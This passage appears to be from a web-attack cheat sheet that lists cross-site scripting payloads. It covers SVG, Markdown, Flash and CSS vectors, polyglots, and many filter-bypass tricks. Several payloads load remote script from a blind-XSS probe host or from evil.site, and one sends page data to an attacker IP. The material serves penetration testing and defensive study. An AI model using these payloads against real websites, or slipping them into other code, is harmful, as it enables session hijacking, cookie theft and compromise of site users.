data:\ndata:text/html,\u0026lt;script\u0026gt;alert(0)\u0026lt;/script\u0026gt; data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ \u0026lt;script src=\u0026#34;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; XSS with vbscript: only IE\nvbscript:msgbox(\u0026#34;XSS\u0026#34;) XSS in files # ** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.\n\u0026lt;name\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[\u0026lt;script\u0026gt;confirm(document.domain)\u0026lt;/script\u0026gt;]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/name\u0026gt; XSS in XML # \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;something:script xmlns:something=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt;alert(1)\u0026lt;/something:script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; XSS in SVG # \u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE svg PUBLIC \u0026#34;-//W3C//DTD SVG 1.1//EN\u0026#34; \u0026#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\u0026#34;\u0026gt; \u0026lt;svg version=\u0026#34;1.1\u0026#34; baseProfile=\u0026#34;full\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;polygon id=\u0026#34;triangle\u0026#34; points=\u0026#34;0,0 0,50 50,0\u0026#34; fill=\u0026#34;#009900\u0026#34; stroke=\u0026#34;#004400\u0026#34;/\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; alert(document.domain); \u0026lt;/script\u0026gt; \u0026lt;/svg\u0026gt; XSS in SVG (short) # \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; onload=\u0026#34;alert(document.domain)\u0026#34;/\u0026gt; \u0026lt;svg\u0026gt;\u0026lt;desc\u0026gt;\u0026lt;![CDATA[\u0026lt;/desc\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;]]\u0026gt;\u0026lt;/svg\u0026gt; \u0026lt;svg\u0026gt;\u0026lt;foreignObject\u0026gt;\u0026lt;![CDATA[\u0026lt;/foreignObject\u0026gt;\u0026lt;script\u0026gt;alert(2)\u0026lt;/script\u0026gt;]]\u0026gt;\u0026lt;/svg\u0026gt; \u0026lt;svg\u0026gt;\u0026lt;title\u0026gt;\u0026lt;![CDATA[\u0026lt;/title\u0026gt;\u0026lt;script\u0026gt;alert(3)\u0026lt;/script\u0026gt;]]\u0026gt;\u0026lt;/svg\u0026gt; XSS in Markdown # [a](javascript:prompt(document.cookie)) [a](j a v a s c r i p t:prompt(document.cookie)) [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K) [a](javascript:window.onerror=alert;throw%201) XSS in SWF flash application # Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain); IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);} IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1); more payloads in ./files\nXSS in SWF flash application # flashmediaelement.swf?jsinitfunctio%gn=alert`1` flashmediaelement.swf?jsinitfunctio%25gn=alert(1) ZeroClipboard.swf?id=\\\u0026#34;))} catch(e) {alert(1);}//\u0026amp;width=1000\u0026amp;height=1000 swfupload.swf?movieName=\u0026#34;]);}catch(e){}if(!self.a)self.a=!alert(1);// swfupload.swf?buttonText=test\u0026lt;a href=\u0026#34;javascript:confirm(1)\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg\u0026#34;/\u0026gt;\u0026lt;/a\u0026gt;\u0026amp;.swf plupload.flash.swf?%#target%g=alert\u0026amp;uid%g=XSS\u0026amp; moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true video-js.swf?readyFunction=alert(1) player.swf?playerready=alert(document.cookie) player.swf?tracecall=alert(document.cookie) banner.swf?clickTAG=javascript:alert(1);// io.swf?yid=\\\u0026#34;));}catch(e){alert(1);}// video-js.swf?readyFunction=alert%28document.domain%2b\u0026#39;%20XSSed!\u0026#39;%29 bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4 flashcanvas.swf?id=test\\\u0026#34;));}catch(e){alert(document.domain)}// phpmyadmin/js/canvg/flashcanvas.swf?id=test\\”));}catch(e){alert(document.domain)}// XSS in CSS # \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;style\u0026gt; div { background-image: url(\u0026#34;data:image/jpg;base64,\u0026lt;\\/style\u0026gt;\u0026lt;svg/onload=alert(document.domain)\u0026gt;\u0026#34;); background-color: #cccccc; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;lol\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; XSS in PostMessage # If the target origin is asterisk * the message can be sent to any domain has reference to the child page.\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;input type=button value=\u0026#34;Click Me\u0026#34; id=\u0026#34;btn\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt; document.getElementById(\u0026#39;btn\u0026#39;).onclick = function(e){ window.poc = window.open(\u0026#39;http://www.redacted.com/#login\u0026#39;); setTimeout(function(){ window.poc.postMessage( { \u0026#34;sender\u0026#34;: \u0026#34;accounts\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;javascript:confirm(\u0026#39;XSS\u0026#39;)\u0026#34;, }, \u0026#39;*\u0026#39; ); }, 2000); } \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Blind XSS # XSS Hunter # Available at https://xsshunter.com/app\nXSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.\n\u0026#34;\u0026gt;\u0026lt;script src=//yoursubdomain.xss.ht\u0026gt;\u0026lt;/script\u0026gt; javascript:eval(\u0026#39;var a=document.createElement(\\\u0026#39;script\\\u0026#39;);a.src=\\\u0026#39;https://yoursubdomain.xss.ht\\\u0026#39;;document.body.appendChild(a)\u0026#39;) \u0026lt;script\u0026gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\u0026#34;load\u0026#34;, b);a.open(\u0026#34;GET\u0026#34;, \u0026#34;//yoursubdomain.xss.ht\u0026#34;);a.send();\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;$.getScript(\u0026#34;//yoursubdomain.xss.ht\u0026#34;)\u0026lt;/script\u0026gt; Other Blind XSS tools # sleepy-puppy - Netflix bXSS - LewisArdern ezXSS - ssl Blind XSS endpoint # Contact forms Ticket support Referer Header Custom Site Analytics Administrative Panel logs User Agent Custom Site Analytics Administrative Panel logs Comment Box Administrative Panel Tips # You can use a Data grabber for XSS and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.\nEg. payload\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://10.10.14.30:8080/XSS/grabber.php?c=\u0026#39;+document.domain\u0026lt;/script\u0026gt; Eg. one-line HTTP server:\n$ ruby -run -ehttpd . -p8080 Mutated XSS # Use browsers quirks to recreate some HTML tags when it is inside an element.innerHTML.\nMutated XSS from Masato Kinugawa, used against DOMPurify component on Google Search. Technical blogposts available at https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/ and https://research.securitum.com/dompurify-bypass-using-mxss/.\n\u0026lt;noscript\u0026gt;\u0026lt;p title=\u0026#34;\u0026lt;/noscript\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt;\u0026#34;\u0026gt; Polyglot XSS # Polyglot XSS - 0xsobky\njaVasCript:/*-/*`/*\\`/*\u0026#39;/*\u0026#34;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//\u0026lt;/stYle/\u0026lt;/titLe/\u0026lt;/teXtarEa/\u0026lt;/scRipt/--!\u0026gt;\\x3csVg/\u0026lt;sVg/oNloAd=alert()//\u0026gt;\\x3e Polyglot XSS - Ashar Javed\n\u0026#34;\u0026gt;\u0026gt;\u0026lt;marquee\u0026gt;\u0026lt;img src=x onerror=confirm(1)\u0026gt;\u0026lt;/marquee\u0026gt;\u0026#34; \u0026gt;\u0026lt;/plaintext\\\u0026gt;\u0026lt;/|\\\u0026gt;\u0026lt;plaintext/onmouseover=prompt(1) \u0026gt;\u0026lt;script\u0026gt;prompt(1)\u0026lt;/script\u0026gt;@gmail.com\u0026lt;isindex formaction=javascript:alert(/XSS/) type=submit\u0026gt;\u0026#39;--\u0026gt;\u0026#34; \u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;img/id=\u0026#34;confirm\u0026amp;lpar; 1)\u0026#34;/alt=\u0026#34;/\u0026#34;src=\u0026#34;/\u0026#34;onerror=eval(id\u0026amp;%23x29;\u0026gt;\u0026#39;\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;http: //i.imgur.com/P8mL8.jpg\u0026#34;\u0026gt; Polyglot XSS - Mathias Karlsson\n\u0026#34; onclick=alert(1)//\u0026lt;button ‘ onclick=alert(1)//\u0026gt; */ alert(1)// Polyglot XSS - Rsnake\n\u0026#39;;alert(String.fromCharCode(88,83,83))//\u0026#39;;alert(String. fromCharCode(88,83,83))//\u0026#34;;alert(String.fromCharCode (88,83,83))//\u0026#34;;alert(String.fromCharCode(88,83,83))//-- \u0026gt;\u0026lt;/SCRIPT\u0026gt;\u0026#34;\u0026gt;\u0026#39;\u0026gt;\u0026lt;SCRIPT\u0026gt;alert(String.fromCharCode(88,83,83)) \u0026lt;/SCRIPT\u0026gt; Polyglot XSS - Daniel Miessler\n\u0026#39;;alert(String.fromCharCode(88,83,83))//\u0026#39;;alert(String.fromCharCode(88,83,83))//\u0026#34;;alert(String.fromCharCode(88,83,83))//\u0026#34;;alert(String.fromCharCode(88,83,83))//--\u0026gt;\u0026lt;/SCRIPT\u0026gt;\u0026#34;\u0026gt;\u0026#39;\u0026gt;\u0026lt;SCRIPT\u0026gt;alert(String.fromCharCode(88,83,83))\u0026lt;/SCRIPT\u0026gt; “ onclick=alert(1)//\u0026lt;button ‘ onclick=alert(1)//\u0026gt; */ alert(1)// \u0026#39;\u0026#34;\u0026gt;\u0026gt;\u0026lt;marquee\u0026gt;\u0026lt;img src=x onerror=confirm(1)\u0026gt;\u0026lt;/marquee\u0026gt;\u0026#34;\u0026gt;\u0026lt;/plaintext\\\u0026gt;\u0026lt;/|\\\u0026gt;\u0026lt;plaintext/onmouseover=prompt(1)\u0026gt;\u0026lt;script\u0026gt;prompt(1)\u0026lt;/script\u0026gt;@gmail.com\u0026lt;isindex formaction=javascript:alert(/XSS/) type=submit\u0026gt;\u0026#39;--\u0026gt;\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;img/id=\u0026#34;confirm\u0026amp;lpar;1)\u0026#34;/alt=\u0026#34;/\u0026#34;src=\u0026#34;/\u0026#34;onerror=eval(id\u0026amp;%23x29;\u0026gt;\u0026#39;\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;http://i.imgur.com/P8mL8.jpg\u0026#34;\u0026gt; javascript://\u0026#39;/\u0026lt;/title\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/script\u0026gt;--\u0026gt;\u0026lt;p\u0026#34; onclick=alert()//\u0026gt;*/alert()/* javascript://--\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/title\u0026gt;\u0026lt;/style\u0026gt;\u0026#34;/\u0026lt;/textarea\u0026gt;*/\u0026lt;alert()/*\u0026#39; onclick=alert()//\u0026gt;a javascript://\u0026lt;/title\u0026gt;\u0026#34;/\u0026lt;/script\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/textarea/--\u0026gt;*/\u0026lt;alert()/*\u0026#39; onclick=alert()//\u0026gt;/ javascript://\u0026lt;/title\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/textarea\u0026gt;--\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;a\u0026#34;//\u0026#39; onclick=alert()//\u0026gt;*/alert()/* javascript://\u0026#39;//\u0026#34; --\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/title\u0026gt;\u0026lt;b onclick= alert()//\u0026gt;*/alert()/* javascript://\u0026lt;/title\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/script --\u0026gt;\u0026lt;li \u0026#39;//\u0026#34; \u0026#39;*/alert()/*\u0026#39;, onclick=alert()// javascript:alert()//--\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/title\u0026gt;\u0026lt;a\u0026#34;//\u0026#39; onclick=alert()//\u0026gt;*/alert()/* --\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/title\u0026gt;\u0026lt;/style\u0026gt;\u0026#34;/\u0026lt;/textarea\u0026gt;\u0026lt;a\u0026#39; onclick=alert()//\u0026gt;*/alert()/* /\u0026lt;/title/\u0026#39;/\u0026lt;/style/\u0026lt;/script/\u0026lt;/textarea/--\u0026gt;\u0026lt;p\u0026#34; onclick=alert()//\u0026gt;*/alert()/* javascript://--\u0026gt;\u0026lt;/title\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;svg \u0026#34;//\u0026#39; onclick=alert()// /\u0026lt;/title/\u0026#39;/\u0026lt;/style/\u0026lt;/script/--\u0026gt;\u0026lt;p\u0026#34; onclick=alert()//\u0026gt;*/alert()/* Polyglot XSS - @s0md3v --\u0026gt;\u0026#39;\u0026#34;/\u0026gt;\u0026lt;/sCript\u0026gt;\u0026lt;svG x=\u0026#34;\u0026gt;\u0026#34; onload=(co\\u006efirm)``\u0026gt; \u0026lt;svg%0Ao%00nload=%09((pro\\u006dpt))()// Polyglot XSS - from @filedescriptor\u0026rsquo;s Polyglot Challenge\n# by crlf javascript:\u0026#34;/*\u0026#39;/*`/*--\u0026gt;\u0026lt;/noscript\u0026gt;\u0026lt;/title\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/template\u0026gt;\u0026lt;/noembed\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;html \\\u0026#34; onmouseover=/*\u0026amp;lt;svg/*/onload=alert()//\u0026gt; # by europa javascript:\u0026#34;/*\u0026#39;/*`/*\\\u0026#34; /*\u0026lt;/title\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/noscript\u0026gt;\u0026lt;/noembed\u0026gt;\u0026lt;/template\u0026gt;\u0026lt;/script/--\u0026gt;\u0026amp;lt;svg/onload=/*\u0026lt;html/*/onmouseover=alert()//\u0026gt; # by EdOverflow javascript:\u0026#34;/*\\\u0026#34;/*`/*\u0026#39; /*\u0026lt;/template\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/noembed\u0026gt;\u0026lt;/noscript\u0026gt;\u0026lt;/title\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/script\u0026gt;--\u0026gt;\u0026amp;lt;svg onload=/*\u0026lt;html/*/onmouseover=alert()//\u0026gt; # by h1/ragnar javascript:`//\u0026#34;//\\\u0026#34;//\u0026lt;/title\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/style\u0026gt;\u0026lt;/noscript\u0026gt;\u0026lt;/noembed\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/template\u0026gt;\u0026amp;lt;svg/onload=\u0026#39;/*--\u0026gt;\u0026lt;html */ onmouseover=alert()//\u0026#39;\u0026gt;` Polyglot XSS - from brutelogic\nJavaScript://%250Aalert?.(1)//\u0026#39;/*\\\u0026#39;/*\u0026#34;/*\\\u0026#34;/*`/*\\`/*%26apos;)/*\u0026lt;!--\u0026gt;\u0026lt;/Title/\u0026lt;/Style/\u0026lt;/Script/\u0026lt;/textArea/\u0026lt;/iFrame/\u0026lt;/noScript\u0026gt;\\74k\u0026lt;K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//\u0026gt;\u0026lt;Base/Href=//X55.is\\76--\u0026gt; Filter Bypass and exotic payloads # Bypass case sensitive # \u0026lt;sCrIpt\u0026gt;alert(1)\u0026lt;/ScRipt\u0026gt; Bypass tag blacklist # \u0026lt;script x\u0026gt; \u0026lt;script x\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;script y\u0026gt; Bypass word blacklist with code evaluation # eval(\u0026#39;ale\u0026#39;+\u0026#39;rt(0)\u0026#39;); Function(\u0026#34;ale\u0026#34;+\u0026#34;rt(1)\u0026#34;)(); new Function`al\\ert\\`6\\``; setTimeout(\u0026#39;ale\u0026#39;+\u0026#39;rt(2)\u0026#39;); setInterval(\u0026#39;ale\u0026#39;+\u0026#39;rt(10)\u0026#39;); Set.constructor(\u0026#39;ale\u0026#39;+\u0026#39;rt(13)\u0026#39;)(); Set.constructor`al\\x65rt\\x2814\\x29```; Bypass with incomplete html tag # Works on IE/Firefox/Chrome/Safari\n\u0026lt;img src=\u0026#39;1\u0026#39; onerror=\u0026#39;alert(0)\u0026#39; \u0026lt; Bypass quotes for string # String.fromCharCode(88,83,83) Bypass quotes in script tag # http://localhost/bla.php?test=\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;html\u0026gt; \u0026lt;script\u0026gt; \u0026lt;?php echo \u0026#39;foo=\u0026#34;text \u0026#39;.$_GET[\u0026#39;test\u0026#39;].\u0026#39;\u0026#34;;\u0026#39;;`?\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Bypass quotes in mousedown event # You can bypass a single quote with ' in an on mousedown event handler\n\u0026lt;a href=\u0026#34;\u0026#34; onmousedown=\u0026#34;var name = \u0026#39;\u0026amp;#39;;alert(1)//\u0026#39;; alert(\u0026#39;smthg\u0026#39;)\u0026#34;\u0026gt;Link\u0026lt;/a\u0026gt; Bypass dot filter # \u0026lt;script\u0026gt;window[\u0026#39;alert\u0026#39;](document[\u0026#39;domain\u0026#39;])\u0026lt;/script\u0026gt; Convert IP address into decimal format: IE. http://192.168.1.1 == http://3232235777 http://www.geektools.com/cgi-bin/ipconv.cgi\n\u0026lt;script\u0026gt;eval(atob(\u0026#34;YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\u0026#34;))\u0026lt;script\u0026gt; Base64 encoding your XSS payload with Linux command: IE. echo -n \u0026quot;alert(document.cookie)\u0026quot; | base64 == YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\nBypass parenthesis for string # alert`1` setTimeout`alert\\u0028document.domain\\u0029`; Bypass parenthesis and semi colon # // From @garethheyes \u0026lt;script\u0026gt;onerror=alert;throw 1337\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;{onerror=alert}throw 1337\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;throw onerror=alert,\u0026#39;some string\u0026#39;,123,\u0026#39;haha\u0026#39;\u0026lt;/script\u0026gt; // From @terjanq \u0026lt;script\u0026gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]\u0026lt;/script\u0026gt; // From @cgvwzq \u0026lt;script\u0026gt;TypeError.prototype.name =\u0026#39;=/\u0026#39;,0[onerror=eval][\u0026#39;/-alert(1)//\u0026#39;]\u0026lt;/script\u0026gt; Bypass onxxxx= blacklist # \u0026lt;object onafterscriptexecute=confirm(0)\u0026gt; \u0026lt;object onbeforescriptexecute=confirm(0)\u0026gt; // Bypass onxxx= filter with a null byte/vertical tab \u0026lt;img src=\u0026#39;1\u0026#39; onerror\\x00=alert(0) /\u0026gt; \u0026lt;img src=\u0026#39;1\u0026#39; onerror\\x0b=alert(0) /\u0026gt; // Bypass onxxx= filter with a \u0026#39;/\u0026#39; \u0026lt;img src=\u0026#39;1\u0026#39; onerror/=alert(0) /\u0026gt; Bypass space filter # // Bypass space filter with \u0026#34;/\u0026#34; \u0026lt;img/src=\u0026#39;1\u0026#39;/onerror=alert(0)\u0026gt; // Bypass space filter with 0x0c/^L \u0026lt;svg\u000conload\u000c=\u000calert(1)\u000c\u0026gt; $ echo \u0026#34;\u0026lt;svg^Lonload^L=^Lalert(1)^L\u0026gt;\u0026#34; | xxd 00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c \u0026lt;svg.onload.=.al 00000010: 6572 7428 3129 0c3e 0a ert(1).\u0026gt;. Bypass email filter # (RFC compliant)\n\u0026#34;\u0026gt;\u0026lt;svg/onload=confirm(1)\u0026gt;\u0026#34;@x.y Bypass document blacklist # \u0026lt;div id = \u0026#34;x\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;script\u0026gt;alert(x.parentNode.parentNode.parentNode.location)\u0026lt;/script\u0026gt; window[\u0026#34;doc\u0026#34;+\u0026#34;ument\u0026#34;] Bypass using javascript inside a string # \u0026lt;script\u0026gt; foo=\u0026#34;text \u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;; \u0026lt;/script\u0026gt; Bypass using an alternate way to redirect # location=\u0026#34;http://google.com\u0026#34; document.location = \u0026#34;http://google.com\u0026#34; document.location.href=\u0026#34;http://google.com\u0026#34; window.location.assign(\u0026#34;http://google.com\u0026#34;) window[\u0026#39;location\u0026#39;][\u0026#39;href\u0026#39;]=\u0026#34;http://google.com\u0026#34; Bypass using an alternate way to execute an alert # From @brutelogic tweet.\nwindow[\u0026#39;alert\u0026#39;](0) parent[\u0026#39;alert\u0026#39;](1) self[\u0026#39;alert\u0026#39;](2) top[\u0026#39;alert\u0026#39;](3) this[\u0026#39;alert\u0026#39;](4) frames[\u0026#39;alert\u0026#39;](5) content[\u0026#39;alert\u0026#39;](6) [7].map(alert) [8].find(alert) [9].every(alert) [10].filter(alert) [11].findIndex(alert) [12].forEach(alert); From @theMiddle - Using global variables\nThe Object.keys() method returns an array of a given object\u0026rsquo;s own property names, in the same order as we get with a normal loop. That\u0026rsquo;s means that we can access any JavaScript function by using its index number instead the function name.\nc=0; for(i in self) { if(i == \u0026#34;alert\u0026#34;) { console.log(c); } c++; } // 5 Then calling alert is :\nObject.keys(self)[5] // \u0026#34;alert\u0026#34; self[Object.keys(self)[5]](\u0026#34;1\u0026#34;) // alert(\u0026#34;1\u0026#34;) We can find \u0026ldquo;alert\u0026rdquo; with a regular expression like ^a[rel]+t$ :\na=()=\u0026gt;{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a() // then you can use a() with Object.keys self[Object.keys(self)[a()]](\u0026#34;1\u0026#34;) // alert(\u0026#34;1\u0026#34;) Oneliner:\na=()=\u0026gt;{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](\u0026#34;1\u0026#34;) From @quanyang tweet.\nprompt`${document.domain}` document.location=\u0026#39;java\\tscript:alert(1)\u0026#39; document.location=\u0026#39;java\\rscript:alert(1)\u0026#39; document.location=\u0026#39;java\\tscript:alert(1)\u0026#39; From @404death tweet.\neval(\u0026#39;ale\u0026#39;+\u0026#39;rt(0)\u0026#39;); Function(\u0026#34;ale\u0026#34;+\u0026#34;rt(1)\u0026#34;)(); new Function`al\\ert\\`6\\``; constructor.constructor(\u0026#34;aler\u0026#34;+\u0026#34;t(3)\u0026#34;)(); [].filter.constructor(\u0026#39;ale\u0026#39;+\u0026#39;rt(4)\u0026#39;)(); top[\u0026#34;al\u0026#34;+\u0026#34;ert\u0026#34;](5); top[8680439..toString(30)](7); top[/al/.source+/ert/.source](8); top[\u0026#39;al\\x65rt\u0026#39;](9); open(\u0026#39;java\u0026#39;+\u0026#39;script:ale\u0026#39;+\u0026#39;rt(11)\u0026#39;); location=\u0026#39;javascript:ale\u0026#39;+\u0026#39;rt(12)\u0026#39;; setTimeout`alert\\u0028document.domain\\u0029`; setTimeout(\u0026#39;ale\u0026#39;+\u0026#39;rt(2)\u0026#39;); setInterval(\u0026#39;ale\u0026#39;+\u0026#39;rt(10)\u0026#39;); Set.constructor(\u0026#39;ale\u0026#39;+\u0026#39;rt(13)\u0026#39;)(); Set.constructor`al\\x65rt\\x2814\\x29```; Bypass using an alternate way to trigger an alert\nvar i = document.createElement(\u0026#34;iframe\u0026#34;); i.onload = function(){ i.contentWindow.alert(1); } document.appendChild(i); // Bypassed security XSSObject.proxy = function (obj, name, report_function_name, exec_original) { var proxy = obj[name]; obj[name] = function () { if (exec_original) { return proxy.apply(this, arguments); } }; XSSObject.lockdown(obj, name); }; XSSObject.proxy(window, \u0026#39;alert\u0026#39;, \u0026#39;window.alert\u0026#39;, false); Bypass \u0026ldquo;\u0026gt;\u0026rdquo; using nothing # You don\u0026rsquo;t need to close your tags.\n\u0026lt;svg onload=alert(1)// Bypass \u0026ldquo;\u0026lt;\u0026rdquo; and \u0026ldquo;\u0026gt;\u0026rdquo; using ＜ and ＞ # Unicode Character U+FF1C and U+FF1E\n＜script/src=//evil.site/poc.js＞ Bypass \u0026ldquo;;\u0026rdquo; using another character # \u0026#39;te\u0026#39; * alert(\u0026#39;*\u0026#39;) * \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; / alert(\u0026#39;/\u0026#39;) / \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; % alert(\u0026#39;%\u0026#39;) % \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; - alert(\u0026#39;-\u0026#39;) - \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; + alert(\u0026#39;+\u0026#39;) + \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; ^ alert(\u0026#39;^\u0026#39;) ^ \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; \u0026gt; alert(\u0026#39;\u0026gt;\u0026#39;) \u0026gt; \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; \u0026lt; alert(\u0026#39;\u0026lt;\u0026#39;) \u0026lt; \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; == alert(\u0026#39;==\u0026#39;) == \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; \u0026amp; alert(\u0026#39;\u0026amp;\u0026#39;) \u0026amp; \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; , alert(\u0026#39;,\u0026#39;) , \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; | alert(\u0026#39;|\u0026#39;) | \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; ? alert(\u0026#39;ifelsesh\u0026#39;) : \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; in alert(\u0026#39;in\u0026#39;) in \u0026#39;xt\u0026#39;; \u0026#39;te\u0026#39; instanceof alert(\u0026#39;instanceof\u0026#39;) instanceof \u0026#39;xt\u0026#39;; Bypass using HTML encoding # %26%2397;lert(1) \u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116; \u0026gt;\u0026lt;/script\u0026gt;\u0026lt;svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)\u0026gt; Bypass using Katana # Using the Katakana library.\njavascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+\u0026#39;(-~ウ)\u0026#39;)() Bypass using Cuneiform # 𒀀=\u0026#39;\u0026#39;,𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++], 𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+\u0026#34;(𒀀)\u0026#34;)() Bypass using Lontara # 